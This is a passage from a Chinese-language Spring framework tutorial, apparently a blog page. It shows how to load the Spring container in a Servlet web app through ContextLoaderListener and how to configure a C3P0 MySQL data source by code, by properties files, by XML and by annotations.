使用Bean执行相应的操作</span>userService.<span class="hljs-built_in">sing</span>();<span class="hljs-comment">// 关闭应用程序上下文</span>context.<span class="hljs-built_in">close</span>();&#125;</code></pre></div><h1 id="Spring结合Servlet开发项目"><a href="#Spring结合Servlet开发项目" class="headerlink" title="Spring结合Servlet开发项目"></a>Spring结合Servlet开发项目</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>传统方式创建Spring容器，Spring容器是通过<strong>new ClasspathXmlApplicationContext(spring配置文件)</strong> 方式获取的，但是每次从容器中获得Bean时都要编写<strong>new ClasspathXmlApplicationContext(spring配置文件)</strong> ，这样的弊端是配置文件加载多次，应用上下文对象创建多次。</p><p>集成web环境方式创建Spring容器，<strong>Spring通过集成web环境，在启动web时通过监听器来自动加载Spring核心配置文件创建Spring容器。</strong></p><p>在Web环境中，可以使用<strong>ServletContextListener</strong>监听Web应用的启动，我们可以在Web应用启动时，就加载Spring的配置文件，创建应用上下文对象<strong>ApplicationContext</strong>，在将其存储到最大的域<strong>servletContext</strong>域中，这样就可以在任意位置从域中获得应用上下文<strong>ApplicationContext</strong>对象了。</p><p>Spring提供了一个监听器<strong>ContextLoaderListener</strong>，该监听器内部自动加载Spring核心配置文件，创建应用上下文对象，并存储到<strong>ServletContext</strong>域中，然后使用Spring提供的<strong>WebApplicationContextUtils客户端工具</strong>来获得Spring容器。</p><h2 id="开发步骤-2"><a href="#开发步骤-2" class="headerlink" title="开发步骤"></a>开发步骤</h2><ol><li>创建web项目</li><li>导入spring和servlet依赖</li><li>创建Dao层接口和实现类</li><li>创建Service层接口和实现类</li><li>创建和配置Spring配置文件</li><li>创建和配置Servlet类</li><li>配置web.xml文件</li><li>客户端测试</li></ol><h2 id="具体实现-2"><a href="#具体实现-2" class="headerlink" title="具体实现"></a>具体实现</h2><h3 id="创建web项目"><a href="#创建web项目" class="headerlink" title="创建web项目"></a>创建web项目</h3><p>选择maven模块，勾选从架构中创建</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230208181310117.png"></p><p>使用该架构创建的项目默认无java和resources文件夹，需手动创建</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230208181656824.png"></p><h3 id="导入spring和servlet依赖"><a href="#导入spring和servlet依赖" class="headerlink" title="导入spring和servlet依赖"></a>导入spring和servlet依赖</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-context<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.0.5.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.0.5.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><h3 id="创建Dao层接口和实现类-2"><a href="#创建Dao层接口和实现类-2" class="headerlink" title="创建Dao层接口和实现类"></a>创建Dao层接口和实现类</h3><p>UserDao.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserDao</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span>;&#125;</code></pre></div><p>UserDaoImpl.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.example.dao.UserDao;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDaoImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserDao</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserDaoImpl</span><span class="hljs-params">()</span>&#123;        System.out.println(<span class="hljs-string">&quot;exec Construction  method&quot;</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;        System.out.println(<span class="hljs-string">&quot;exec Init method..&quot;</span>);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;        System.out.println(<span class="hljs-string">&quot;userDaoImpl save running...&quot;</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span>&#123;        System.out.println(<span class="hljs-string">&quot;exec Destroy method..&quot;</span>);    &#125;&#125;</code></pre></div><h3 id="创建Service层接口和实现类-2"><a href="#创建Service层接口和实现类-2" class="headerlink" title="创建Service层接口和实现类"></a>创建Service层接口和实现类</h3><p>UserService.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.service;<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span>;&#125;</code></pre></div><p>UserServiceImpl.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.service.impl;<span class="hljs-keyword">import</span> com.example.dao.UserDao;<span class="hljs-keyword">import</span> com.example.service.UserService;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;    <span class="hljs-keyword">private</span> UserDao userDao;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserDao</span><span class="hljs-params">(UserDao userDao)</span> &#123;        <span class="hljs-built_in">this</span>.userDao = userDao;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;        userDao.save();    &#125;&#125;</code></pre></div><h3 id="创建和配置Spring配置文件-1"><a href="#创建和配置Spring配置文件-1" class="headerlink" title="创建和配置Spring配置文件"></a>创建和配置Spring配置文件</h3><p>ApplicationContext.xml</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.dao.impl.UserDaoImpl&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;userService&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.service.impl.UserServiceImpl&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;userDao&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><h3 id="创建和配置Servlet类"><a href="#创建和配置Servlet类" class="headerlink" title="创建和配置Servlet类"></a>创建和配置Servlet类</h3><p>UserSpringServlet.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.web;<span class="hljs-keyword">import</span> com.example.service.UserService;<span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<span class="hljs-keyword">import</span> javax.servlet.ServletContext;<span class="hljs-keyword">import</span> javax.servlet.ServletException;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserSpringServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-comment">/**</span><span class="hljs-comment">         * 使用spring提供的web应用上下文工具</span><span class="hljs-comment">         */</span>        <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getServletContext();        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">app</span> <span class="hljs-operator">=</span> org.springframework.web.context.support.WebApplicationContextUtils.getWebApplicationContext(servletContext);        <span class="hljs-type">UserService</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> app.getBean(UserService.class);        userService.save();    &#125;&#125;</code></pre></div><h3 id="配置web-xml文件"><a href="#配置web-xml文件" class="headerlink" title="配置web.xml文件"></a>配置web.xml文件</h3><p>web.xml</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;3.0&quot;</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span>&gt;</span>  <span class="hljs-comment">&lt;!--配置UserSpringServlet--&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>UserSpringServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.example.web.UserSpringServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>UserSpringServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/UserSpringServlet<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span>  <span class="hljs-comment">&lt;!--使用Spring提供的的监听器--&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span>  <span class="hljs-comment">&lt;!--全局初始化参数--&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">context-param</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>classpath:ApplicationContext.xml<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">context-param</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span></code></pre></div><h3 id="客户端测试"><a href="#客户端测试" class="headerlink" title="客户端测试"></a>客户端测试</h3><p>配置tomcat服务，访问<code>http://127.0.0.1:8080/UserSpringServlet</code>观察控制台输出</p><h1 id="Spring配置数据源"><a href="#Spring配置数据源" class="headerlink" title="Spring配置数据源"></a>Spring配置数据源</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="数据源（连接池）的作用"><a href="#数据源（连接池）的作用" class="headerlink" title="数据源（连接池）的作用"></a>数据源（连接池）的作用</h3><ul><li>数据源(连接池)是提高程序性能如出现的</li><li>事先实例化数据源，初始化部分连接资源</li><li>使用连接资源时从数据源中获取</li><li>使用完毕后将连接资源归还给数据源</li></ul><p>常见的数据源(连接池)：<strong>DBCP、C3P0、BoneCP、Druid</strong>等</p><h3 id="数据源的配置步骤"><a href="#数据源的配置步骤" class="headerlink" title="数据源的配置步骤"></a>数据源的配置步骤</h3><ol><li><p>导入数据源的坐标和数据库驱动坐标</p></li><li><p>创建数据源对象</p></li><li><p>设置数据源的基本连接数据</p></li><li><p>使用数据源获取连接资源和归还连接资源</p></li></ol><h2 id="手动创建数据源"><a href="#手动创建数据源" class="headerlink" title="手动创建数据源"></a>手动创建数据源</h2><p>示例代码</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;    <span class="hljs-type">ComboPooledDataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ComboPooledDataSource</span>();    dataSource.setDriverClass(<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>);    dataSource.setJdbcUrl(<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/test&quot;</span>);    dataSource.setUser(<span class="hljs-string">&quot;user123&quot;</span>);    dataSource.setPassword(<span class="hljs-string">&quot;user123&quot;</span>);    <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> dataSource.getConnection();    System.out.println(connection);    dataSource.close();&#125;</code></pre></div><h2 id="手动创建数据源—读取properties文件"><a href="#手动创建数据源—读取properties文件" class="headerlink" title="手动创建数据源—读取properties文件"></a>手动创建数据源—读取properties文件</h2><p>示例代码</p><p>jdbc.properties</p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">jdbc.driver</span>=com.mysql.jdbc.Driver<span class="hljs-attr">jdbc.url</span>=jdbc:mysql://localhost:<span class="hljs-number">3306</span>/test<span class="hljs-attr">jdbc.username</span>=user123<span class="hljs-attr">jdbc.password</span>=user123</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test3</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> PropertyVetoException, SQLException &#123;    <span class="hljs-type">ResourceBundle</span> <span class="hljs-variable">resourceBundle</span> <span class="hljs-operator">=</span> ResourceBundle.getBundle(<span class="hljs-string">&quot;jdbc&quot;</span>);    <span class="hljs-type">String</span> <span class="hljs-variable">driver</span> <span class="hljs-operator">=</span> resourceBundle.getString(<span class="hljs-string">&quot;jdbc.driver&quot;</span>);    <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> resourceBundle.getString(<span class="hljs-string">&quot;jdbc.url&quot;</span>);    <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> resourceBundle.getString(<span class="hljs-string">&quot;jdbc.username&quot;</span>);    <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> resourceBundle.getString(<span class="hljs-string">&quot;jdbc.password&quot;</span>);    <span class="hljs-type">ComboPooledDataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ComboPooledDataSource</span>();    dataSource.setDriverClass(driver);    dataSource.setJdbcUrl(url);    dataSource.setUser(username);    dataSource.setPassword(password);    <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> dataSource.getConnection();    System.out.println(connection);    dataSource.close();&#125;</code></pre></div><h2 id="Spring创建数据源"><a href="#Spring创建数据源" class="headerlink" title="Spring创建数据源"></a>Spring创建数据源</h2><p>示例代码</p><p>ApplicationContext-dataSource.xml</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;</span></span><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>    <span class="hljs-comment">&lt;!-- 通过Spring配置数据源--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dataSource&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.mchange.v2.c3p0.ComboPooledDataSource&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driverClass&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;jdbcUrl&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/test&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;user123&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;user123&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test4</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">app</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;ApplicationContext-dataSource.xml&quot;</span>);    <span class="hljs-type">DataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> (DataSource) app.getBean(<span class="hljs-string">&quot;dataSource&quot;</span>);    <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> dataSource.getConnection();    System.out.println(connection);&#125;</code></pre></div><h2 id="Spring创建数据源—读取properties文件"><a href="#Spring创建数据源—读取properties文件" class="headerlink" title="Spring创建数据源—读取properties文件"></a>Spring创建数据源—读取properties文件</h2><h3 id="配置文件形式"><a href="#配置文件形式" class="headerlink" title="配置文件形式"></a>配置文件形式</h3><p><strong>示例代码</strong></p><p>jdbc.properties</p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">jdbc.driver</span>=com.mysql.jdbc.Driver<span class="hljs-attr">jdbc.url</span>=jdbc:mysql://localhost:<span class="hljs-number">3306</span>/test<span class="hljs-attr">jdbc.username</span>=root<span class="hljs-attr">jdbc.password</span>=<span class="hljs-number">123456</span></code></pre></div><p>ApplicationContext-dataSource.xml</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;</span></span><span class="hljs-string"><span class="hljs-tag">       http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span></span><span class="hljs-string"><span class="hljs-tag">       http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span>    <span class="hljs-comment">&lt;!--通过Spring读取properties文件方式创建C3P0数据源--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">context:property-placeholder</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;jdbc.properties&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">context:property-placeholder</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dataSource&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.mchange.v2.c3p0.ComboPooledDataSource&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driverClass&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.driver&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;jdbcUrl&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.url&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.username&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.password&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test4</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">app</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;ApplicationContext-dataSource.xml&quot;</span>);    <span class="hljs-type">DataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> (DataSource) app.getBean(<span class="hljs-string">&quot;dataSource&quot;</span>);    <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> dataSource.getConnection();    System.out.println(connection);&#125;</code></pre></div><h3 id="注解形式"><a href="#注解形式" class="headerlink" title="注解形式"></a>注解形式</h3><p>示例代码</p><p>jdbc.properties</p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">jdbc.driver</span>=com.mysql.jdbc.Driver<span class="hljs-attr">jdbc.url</span>=jdbc:mysql://localhost:<span class="hljs-number">3306</span>/test<span class="hljs-attr">jdbc.username</span>=user123<span class="hljs-attr">jdbc.password</span>=user123</code></pre></div><p>DataSourceConfig.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><span class="hljs-meta">@PropertySource(&quot;classpath:jdbc.properties&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataSourceConfig</span> &#123;    <span class="hljs-meta">@Value(&quot;$&#123;jdbc.driver&#125;&quot;)</span>    <span class="hljs-keyword">public</span> String driver;    <span class="hljs-meta">@Value(&quot;$&#123;jdbc.url&#125;&quot;)</span>    <span class="hljs-keyword">public</span> String url;    <span class="hljs-meta">@Value(&quot;$&#123;jdbc.username&#125;&quot;)</span>    <span class="hljs-keyword">public</span> String username;    <span class="hljs-meta">@Value(&quot;$&#123;jdbc.password&#125;&quot;)</span>    <span class="hljs-keyword">public</span> String password;    <span class="hljs-meta">@Bean(&quot;dataSource&quot;)</span>    <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">getDataSource</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> PropertyVetoException &#123;        <span class="hljs-type">ComboPooledDataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ComboPooledDataSource</span>();        dataSource.setDriverClass(driver);        dataSource.setJdbcUrl(url);        dataSource.setUser(username);        dataSource.setPassword(password);        <span class="hljs-keyword">return</span>  dataSource;    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test6</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">app</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationConfigApplicationContext</span>(DataSourceConfig.class);    <span class="hljs-type">DataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> (DataSource) app.getBean(<span class="hljs-string">&quot;dataSource&quot;</span>);    <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> dataSource.getConnection();    System.out.println(connection);&#125;</code></pre></div><h1 